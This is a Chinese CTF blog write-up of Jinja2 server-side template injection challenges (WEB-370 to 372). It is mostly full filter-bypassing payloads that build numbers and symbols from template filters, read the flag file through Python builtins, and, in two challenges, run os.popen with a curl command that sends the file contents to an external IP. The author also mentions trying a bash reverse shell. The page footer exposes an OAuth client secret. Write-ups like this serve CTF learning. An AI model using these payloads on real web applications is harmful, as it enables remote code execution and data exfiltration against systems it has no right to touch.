+<h1 id="WEB-370-过滤数字"><a href="#WEB-370-过滤数字" class="headerlink" title="WEB-370(过滤数字)"></a>WEB-370(过滤数字)</h1><p>主要思路是就是用count过滤器搭配join计算字符长度获取数字 然后思路和上一题一样</p>
+<p>payload:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="built_in">set</span> num=<span class="built_in">dict</span>(aaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> numm=<span class="built_in">dict</span>(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> x=(()|select|string|<span class="built_in">list</span>).pop(num)%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> glob = (x,x,<span class="built_in">dict</span>(<span class="built_in">globals</span>=a)|join,x,x)|join %&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> builtins=x~x~(<span class="built_in">dict</span>(builtins=a)|join)~x~x%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> c = <span class="built_in">dict</span>(<span class="built_in">chr</span>=a)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> o = <span class="built_in">dict</span>(o=a,s=a)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> getitem = x~x~(<span class="built_in">dict</span>(getitem=a)|join)~x~x%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> <span class="built_in">chr</span> = lipsum|attr(glob)|attr(getitem)(builtins)|attr(getitem)(c)%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> file = <span class="built_in">chr</span>(numm)~<span class="built_in">dict</span>(flag=a)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">print</span>((lipsum|attr(glob)|attr(getitem)(builtins)).<span class="built_in">open</span>(file).read())%&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="WEB-371-过滤print无回显"><a href="#WEB-371-过滤print无回显" class="headerlink" title="WEB-371(过滤print无回显)"></a>WEB-371(过滤print无回显)</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">/?name=</span><br><span class="line">&#123;%<span class="built_in">set</span> z=<span class="built_in">dict</span>()|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> e=<span class="built_in">dict</span>(a=a)|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> ee=<span class="built_in">dict</span>(aa=a)|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> eee=<span class="built_in">dict</span>(aaa=a)|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> eeee=<span class="built_in">dict</span>(aaaa=a)|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> eeeee=<span class="built_in">dict</span>(aaaaa=a)|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> eeeeee=<span class="built_in">dict</span>(aaaaaa=a)|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> eeeeeee=<span class="built_in">dict</span>(aaaaaaa=a)|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> eeeeeeee=<span class="built_in">dict</span>(aaaaaaaa=a)|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> eeeeeeeee=<span class="built_in">dict</span>(aaaaaaaaa=a)|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> eeeeeeeeee=<span class="built_in">dict</span>(aaaaaaaaaa=a)|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> dayu=(()|select|string|<span class="built_in">list</span>).pop()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> space=(()|select|string|<span class="built_in">list</span>).pop(eeeee*ee)%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> xhx=(()|select|string|<span class="built_in">list</span>).pop(eee*eeeeeeeee) %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> point=(config|string|<span class="built_in">list</span>).pop(eeeeeeeeee*ee*eeeeeeeeee-eeeeeeeee) %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> maohao=(config|string|<span class="built_in">list</span>).pop(ee*eeeeeee) %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> xiegang=(config|string|<span class="built_in">list</span>).pop(-eeeeeeee*eeeeeeee) %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> <span class="built_in">globals</span>=(xhx,xhx,<span class="built_in">dict</span>(<span class="built_in">globals</span>=z)|join,xhx,xhx)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> builtins=(xhx,xhx,<span class="built_in">dict</span>(builtins=z)|join,xhx,xhx)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> ohs=<span class="built_in">dict</span>(o=z,s=z)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> <span class="built_in">open</span>=(lipsum|attr(<span class="built_in">globals</span>)).get(builtins).<span class="built_in">open</span> %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> result=<span class="built_in">open</span>((xiegang,<span class="built_in">dict</span>(flag=z)|join)|join).read() %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> curlcmd=(<span class="built_in">dict</span>(curl=z)|join,space,<span class="built_in">dict</span>(http=z)|join,maohao,xiegang,xiegang,eeeeeeee,point,e,eee,z,point,eee,eeee,point,eeeee,eee,maohao,eeeeeee,eeeeeee,eeeeeee,eeeeeee,xiegang,result)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> shell=(lipsum|attr(<span class="built_in">globals</span>)).get(ohs).popen(curlcmd) %&#125;</span><br></pre></td></tr></table></figure>
+
+<p>先构造出数字0-9 然后去截取我们想要的符号 用curl外带flag</p>
+<p>构造出<code>curl http://ip:port/</code></p>
+<p>一开始自己一直在构造bash反弹shell的 构造了老半天 md发现<code>-&amp;</code>截取不到 没有这两个符号 太难过了 不过对过程有了更深的理解了</p>
+<h1 id="WEB-372-过滤了count"><a href="#WEB-372-过滤了count" class="headerlink" title="WEB-372(过滤了count)"></a>WEB-372(过滤了count)</h1><p>用length替换就行了 然后继续curl外带</p>
+<p>和上面payload差不多</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">/?name=</span><br><span class="line">&#123;%<span class="built_in">set</span> z=<span class="built_in">dict</span>()|join|length%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> e=<span class="built_in">dict</span>(a=a)|join|length%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> ee=<span class="built_in">dict</span>(aa=a)|join|length%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> eee=<span class="built_in">dict</span>(aaa=a)|join|length%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> eeee=<span class="built_in">dict</span>(aaaa=a)|join|length%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> eeeee=<span class="built_in">dict</span>(aaaaa=a)|join|length%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> eeeeee=<span class="built_in">dict</span>(aaaaaa=a)|join|length%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> eeeeeee=<span class="built_in">dict</span>(aaaaaaa=a)|join|length%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> eeeeeeee=<span class="built_in">dict</span>(aaaaaaaa=a)|join|length%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> eeeeeeeee=<span class="built_in">dict</span>(aaaaaaaaa=a)|join|length%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> eeeeeeeeee=<span class="built_in">dict</span>(aaaaaaaaaa=a)|join|length%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> dayu=(()|select|string|<span class="built_in">list</span>).pop()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> space=(()|select|string|<span class="built_in">list</span>).pop(eeeee*ee)%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> xhx=(()|select|string|<span class="built_in">list</span>).pop(eee*eeeeeeeee) %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> point=(config|string|<span class="built_in">list</span>).pop(eeeeeeeeee*ee*eeeeeeeeee-eeeeeeeee) %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> maohao=(config|string|<span class="built_in">list</span>).pop(ee*eeeeeee) %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> xiegang=(config|string|<span class="built_in">list</span>).pop(-eeeeeeee*eeeeeeee) %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> <span class="built_in">globals</span>=(xhx,xhx,<span class="built_in">dict</span>(<span class="built_in">globals</span>=z)|join,xhx,xhx)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> builtins=(xhx,xhx,<span class="built_in">dict</span>(builtins=z)|join,xhx,xhx)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> ohs=<span class="built_in">dict</span>(o=z,s=z)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> <span class="built_in">open</span>=(lipsum|attr(<span class="built_in">globals</span>)).get(builtins).<span class="built_in">open</span> %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> result=<span class="built_in">open</span>((xiegang,<span class="built_in">dict</span>(flag=z)|join)|join).read() %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> curlcmd=(<span class="built_in">dict</span>(curl=z)|join,space,<span class="built_in">dict</span>(http=z)|join,maohao,xiegang,xiegang,eeeeeeee,point,e,eee,z,point,eee,eeee,point,eeeee,eee,maohao,eeeeeee,eeeeeee,eeeeeee,eeeeeee,xiegang,result)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> shell=(lipsum|attr(<span class="built_in">globals</span>)).get(ohs).popen(curlcmd) %&#125;</span><br></pre></td></tr></table></figure>
+
+<p>成功</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1692699535461-6fe5aca5-bfd2-406e-aef9-9ec52ed5e842.png" alt="img"></p>
+<h1 id="后言"><a href="#后言" class="headerlink" title="后言"></a>后言</h1><p>虽然这是一个老生常谈的题目 但是自己对payload不太理解 这次刷过之后 会好很多 不至于看不懂 冲就完了</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/post/c52c3ed.html" rel="prev" title="Flask SSTI简单学习">
+                  <i class="fa fa-chevron-left"></i> Flask SSTI简单学习
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    <div class="comments gitalk-container"></div>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="beian"><a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">陇ICP备 2023001761 </a>
+  </div>
+
+<div class="copyright">
+  &copy; 2023.2 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Z1d10t</span>
+</div>
+
+
+
+    </div>
+  </footer>
+
+  
+
+  <a href="https://github.com/Z1d10t" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.8.0/gitalk.css" integrity="sha256-AJnUHL7dBv6PGaeyPQJcgQPDjt/Hn/PvYZde1iqfp8U=" crossorigin="anonymous">
+
+<script class="next-config" data-name="gitalk" type="application/json">{"enable":true,"github_id":"Z1d10t","repo":"Z1d10t.github.io","client_id":"c9dd41fa890386350257","client_secret":"c78f6b60a410862c2dcc596f09db2f0c06f025c6","admin_user":"Z1d10t","distraction_free_mode":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.8.0/gitalk.min.js","integrity":"sha256-MVK9MGD/XJaGyIghSVrONSnoXoGh3IFxLw0zfvzpxR4="},"path_md5":"279b8cbe5886eda5f1c13cac24436246"}</script>
+<script src="/js/third-party/comments/gitalk.js"></script>
+
+</body>
+</html>
+
